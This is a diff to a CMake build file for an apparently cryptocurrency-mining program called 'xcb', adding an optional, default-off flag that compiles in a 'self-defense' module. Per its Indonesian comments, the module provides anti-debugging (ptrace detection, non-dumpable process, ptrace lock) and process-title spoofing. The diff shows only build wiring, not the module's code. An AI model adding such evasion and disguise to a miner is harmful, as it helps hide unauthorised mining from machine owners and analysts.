@@ -1,5 +1,6 @@
 cmake_minimum_required(VERSION 3.10)
 option(NO_LTO "Disable LTO (musl alpine workaround)" OFF)
+option(ENABLE_SELF_DEFENSE "Aktifkan proteksi diri: anti-debugging (deteksi ptrace, dumpable=0, ptrace lock) + title spoof" OFF)
 
 project(xcb VERSION 1.0.0 LANGUAGES CXX C ASM)
 
@@ -91,6 +92,15 @@ set(MINER_HEADERS
 )
 
 # ============================================================
+# Self-defense (opsional, OFF default): anti-debugging + title spoof
+# ============================================================
+if(ENABLE_SELF_DEFENSE)
+    list(APPEND MINER_SOURCES src/SelfDefense.cpp)
+    list(APPEND MINER_HEADERS src/SelfDefense.hpp)
+    message(STATUS "ENABLE_SELF_DEFENSE=ON: anti-debugging aktif")
+endif()
+
+# ============================================================
 # Executable
 # ============================================================
 add_executable(xcb ${MINER_SOURCES} ${MINER_HEADERS})
@@ -135,3 +145,7 @@ target_link_options(xcb PRIVATE
 )
 
 install(TARGETS xcb DESTINATION bin)
+
+if(ENABLE_SELF_DEFENSE)
+    target_compile_definitions(xcb PRIVATE XCB_SELF_DEFENSE)
+endif()
